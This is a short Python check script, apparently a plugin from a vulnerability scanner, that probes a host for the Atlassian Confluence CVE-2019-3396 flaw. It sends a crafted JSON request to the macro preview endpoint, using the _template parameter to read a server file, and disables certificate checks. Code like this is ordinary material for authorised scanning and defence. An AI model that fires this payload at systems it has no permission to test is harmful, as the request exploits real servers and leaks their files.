# -*- coding:utf-8 -*-

import ssl
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol + '://' + ip + ':' + str(port)
    print('testing if Atlassian confluence cve-2019-3396 remote code exec vul')
    try:
        for path in ["/rest/tinymce/1/macro/preview", "/wiki/rest/tinymce/1/macro/preview"]:
            vulpath = url + path
            headers = {
                "Referer": url,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
            }
            payload = """{"contentId":"0","macro":{"name":"widget","body":"","params":{"url":"http://localhost/www.dailymotion.com/","width":"300","height":"200","_template":"logging.properties"}}}"""
            html = requests.post(vulpath, verify=False, headers=headers,timeout=8, data=payload).text
            if 'confluence' in html and "org.slf4j.bridge.SLF4JBridgeHandler" in html:
                msg = 'There is a Atlassian confluence cve-2019-3396 remote code exec vul on %s' % vulpath
                print(msg)
                number = 'v117'
                return True, url, number, msg
            else:
                pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no Atlassian confluence cve-2019-3396 remote code exec vul'
    number = 'v0'
    return False,url,number,msg


